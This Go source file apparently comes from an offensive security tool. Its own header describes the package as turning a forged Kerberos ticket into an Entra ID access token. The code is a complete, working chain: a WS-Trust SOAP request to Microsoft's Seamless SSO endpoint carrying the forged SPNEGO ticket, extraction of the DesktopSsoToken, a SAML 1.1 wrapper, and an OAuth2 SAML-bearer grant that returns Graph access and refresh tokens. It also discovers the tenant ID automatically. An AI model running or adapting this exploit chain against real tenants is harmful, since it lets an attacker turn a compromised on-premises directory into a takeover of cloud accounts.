// Package exchange converts a forged Kerberos ticket into an Entra ID access token
// via the WS-Trust → SAML → OAuth2 pipeline.
//
// Three sequential HTTP requests:
//  1. WS-Trust SOAP request to autologon.microsoftazuread-sso.com → DesktopSsoToken
//  2. SAML 1.1 assertion wrapping
//  3. OAuth2 SAML bearer grant at login.microsoftonline.com → Access Token
package exchange

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"encoding/xml"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
)

// TokenResult contains the OAuth2 token response.
type TokenResult struct {
	AccessToken  string `json:"access_token"`
	RefreshToken string `json:"refresh_token"`
	ExpiresIn    string `json:"expires_in"`
	ExpiresOn    string `json:"expires_on"`
	Resource     string `json:"resource"`
	TokenType    string `json:"token_type"`
	Scope        string `json:"scope"`
}

// ExchangeParams holds the parameters for the cloud token exchange.
type ExchangeParams struct {
	// Base64-encoded SPNEGO Kerberos ticket
	SPNEGOTicket string
	// On-premises AD domain FQDN (e.g., "corp.contoso.com")
	Domain string
	// Entra ID tenant ID (optional, auto-discovered if empty)
	TenantID string
	// Target resource (e.g., "https://graph.windows.net")
	Resource string
	// OAuth2 client ID (default: Azure AD PowerShell)
	ClientID string
}

// DefaultClientID is the Azure AD PowerShell native client ID,
// used for SAML bearer grant exchanges.
const DefaultClientID = "1b730954-1685-4b74-9bfd-dac224a7b894"

// WS-Trust endpoint template
const wsTrustURL = "https://autologon.microsoftazuread-sso.com/%s/winauth/trust/2005/windowstransport?client-request-id=%s"

// OAuth2 token endpoint template
const tokenURL = "https://login.microsoftonline.com/%s/oauth2/token"

// WS-Trust SOAP 1.2 envelope for DesktopSsoToken request.
const soapEnvelope = `<?xml version='1.0' encoding='UTF-8'?>
<s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:wsse='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd' xmlns:saml='urn:oasis:names:tc:SAML:1.0:assertion' xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy' xmlns:wsu='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd' xmlns:wsa='http://www.w3.org/2005/08/addressing' xmlns:wssc='http://schemas.xmlsoap.org/ws/2005/02/sc' xmlns:wst='http://schemas.xmlsoap.org/ws/2005/02/trust'>
  <s:Header>
    <wsa:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
    <wsa:To s:mustUnderstand='1'>%s</wsa:To>
    <wsa:MessageID>urn:uuid:%s</wsa:MessageID>
  </s:Header>
  <s:Body>
    <wst:RequestSecurityToken Id='RST0'>
      <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
      <wsp:AppliesTo>
        <wsa:EndpointReference>
          <wsa:Address>urn:federation:MicrosoftOnline</wsa:Address>
        </wsa:EndpointReference>
      </wsp:AppliesTo>
      <wst:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</wst:KeyType>
    </wst:RequestSecurityToken>
  </s:Body>
</s:Envelope>`

// GetAccessToken executes the full exchange pipeline.
//
// Step 1 — WS-Trust:
//
//	POST https://autologon.microsoftazuread-sso.com/{domain}/winauth/trust/2005/windowstransport
//	Authorization: Negotiate {spnego_ticket}
//	Content-Type: application/soap+xml; charset=utf-8
//
// Step 2 — SAML:
//
//	Wraps DesktopSsoToken in minimal SAML 1.1 assertion, base64-encodes it.
//
// Step 3 — OAuth2:
//
//	POST https://login.microsoftonline.com/{tenant}/oauth2/token
//	grant_type=urn:ietf:params:oauth:grant-type:saml1_1-bearer
func GetAccessToken(params *ExchangeParams) (*TokenResult, error) {
	if params.ClientID == "" {
		params.ClientID = DefaultClientID
	}
	if params.Resource == "" {
		params.Resource = "https://graph.windows.net"
	}
	if params.TenantID == "" {
		var err error
		params.TenantID, err = discoverTenantID(params.Domain)
		if err != nil {
			return nil, fmt.Errorf("discover tenant: %w", err)
		}
	}

	// Step 1: WS-Trust → DesktopSsoToken
	ssoToken, err := requestDesktopSsoToken(params)
	if err != nil {
		return nil, fmt.Errorf("ws-trust: %w", err)
	}
	fmt.Fprintf(os.Stderr, "[+] DesktopSsoToken extracted (%d chars)\n", len(ssoToken))

	// Step 2: SAML 1.1 assertion
	samlAssertion, err := buildSAMLAssertion(ssoToken)
	if err != nil {
		return nil, fmt.Errorf("saml: %w", err)
	}

	// Step 3: OAuth2 token exchange
	token, err := exchangeSAMLForToken(params.TenantID, params.Resource, params.ClientID, samlAssertion)
	if err != nil {
		return nil, fmt.Errorf("oauth2: %w", err)
	}

	return token, nil
}

// requestDesktopSsoToken sends the WS-Trust SOAP request and extracts the DesktopSsoToken.
func requestDesktopSsoToken(params *ExchangeParams) (string, error) {
	requestID := uuid()
	endpoint := fmt.Sprintf(wsTrustURL, params.Domain, requestID)
	body := fmt.Sprintf(soapEnvelope, endpoint, uuid())

	req, err := http.NewRequest("POST", endpoint, strings.NewReader(body))
	if err != nil {
		return "", err
	}
	req.Header.Set("Authorization", "Negotiate "+params.SPNEGOTicket)
	req.Header.Set("Content-Type", "application/soap+xml; charset=utf-8")
	req.Header.Set("SOAPAction", "http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "", fmt.Errorf("http: %w", err)
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("ws-trust returned %d: %s", resp.StatusCode, string(respBody))
	}

	return extractDesktopSsoToken(respBody)
}

// extractDesktopSsoToken parses the SOAP XML response for the DesktopSsoToken element.
// The actual Microsoft response structure:
//
//	<S:Body>
//	  <wst:RequestSecurityTokenResponse>
//	    <wst:RequestedSecurityToken>
//	      <saml:Assertion>
//	        <DesktopSsoToken>VALUE</DesktopSsoToken>
func extractDesktopSsoToken(xmlData []byte) (string, error) {
	type assertion struct {
		DesktopSsoToken string `xml:"DesktopSsoToken"`
	}
	type rst struct {
		RequestedSecurityToken struct {
			Assertion assertion `xml:"Assertion"`
		} `xml:"RequestedSecurityToken"`
	}
	type body struct {
		RST rst `xml:"RequestSecurityTokenResponse"`
	}
	type envelope struct {
		Body body `xml:"Body"`
	}

	var env envelope
	if err := xml.Unmarshal(xmlData, &env); err != nil {
		return "", fmt.Errorf("parse ws-trust response: %w", err)
	}
	token := env.Body.RST.RequestedSecurityToken.Assertion.DesktopSsoToken
	if token != "" {
		return token, nil
	}

	// Fallback: try with RequestSecurityTokenResponseCollection wrapper
	type rstc struct {
		RSTC struct {
			RequestedSecurityToken struct {
				Assertion assertion `xml:"Assertion"`
			} `xml:"RequestedSecurityToken"`
		} `xml:"RequestSecurityTokenResponseCollection"`
	}
	var env2 struct {
		Body rstc `xml:"Body"`
	}
	if err := xml.Unmarshal(xmlData, &env2); err == nil {
		token = env2.Body.RSTC.RequestedSecurityToken.Assertion.DesktopSsoToken
		if token != "" {
			return token, nil
		}
	}

	return "", fmt.Errorf("DesktopSsoToken not found in WS-Trust response")
}

// buildSAMLAssertion wraps the DesktopSsoToken in a SAML 1.1 assertion and base64-encodes it.
// Matches AADInternals minimal format.
func buildSAMLAssertion(ssoToken string) (string, error) {
	saml := `<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:1.0:assertion"><DesktopSsoToken>` + ssoToken + `</DesktopSsoToken></saml:Assertion>`
	return base64.StdEncoding.EncodeToString([]byte(saml)), nil
}

// exchangeSAMLForToken exchanges the SAML assertion for an OAuth2 access token.
func exchangeSAMLForToken(tenantID, resource, clientID, assertion string) (*TokenResult, error) {
	form := url.Values{
		"grant_type":          {"urn:ietf:params:oauth:grant-type:saml1_1-bearer"},
		"assertion":           {assertion},
		"client_id":           {clientID},
		"resource":            {resource},
		"scope":               {"openid"},
		"windows_api_version": {"2.0"},
		"win_ver":             {"10.0.17763.529"},
		"msafed":              {"0"},
	}
	formBody := form.Encode()

	endpoint := fmt.Sprintf(tokenURL, tenantID)
	req, err := http.NewRequest("POST", endpoint, strings.NewReader(formBody))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("http: %w", err)
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("oauth2 returned %d: %s", resp.StatusCode, string(respBody[:min(len(respBody), 500)]))
	}

	var result TokenResult
	if err := json.Unmarshal(respBody, &result); err != nil {
		return nil, fmt.Errorf("parse oauth2 response: %w", err)
	}
	if result.AccessToken == "" {
		return nil, fmt.Errorf("oauth2 response missing access_token")
	}
	return &result, nil
}

// discoverTenantID discovers the tenant ID from the domain using OpenID Connect discovery.
func discoverTenantID(domain string) (string, error) {
	url := fmt.Sprintf("https://login.microsoftonline.com/%s/.well-known/openid-configuration", domain)
	resp, err := http.DefaultClient.Get(url)
	if err != nil {
		return "", fmt.Errorf("discovery: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("discovery returned %d — domain %s may not be a managed Entra ID tenant", resp.StatusCode, domain)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	// Extract tenant ID from authorization_endpoint:
	// "authorization_endpoint": "https://login.microsoftonline.com/{tenant-id}/oauth2/authorize"
	var config struct {
		AuthEndpoint string `json:"authorization_endpoint"`
	}
	if err := json.Unmarshal(body, &config); err != nil {
		return "", fmt.Errorf("parse discovery: %w", err)
	}

	parts := strings.Split(config.AuthEndpoint, "/")
	for i, p := range parts {
		if p == "login.microsoftonline.com" && i+1 < len(parts) {
			return parts[i+1], nil
		}
	}
	return "", fmt.Errorf("could not extract tenant ID from authorization_endpoint: %s", config.AuthEndpoint)
}

func uuid() string {
	b := make([]byte, 16)
	rand.Read(b)
	b[6] = (b[6] & 0x0f) | 0x40
	b[8] = (b[8] & 0x3f) | 0x80
	return fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
		b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}
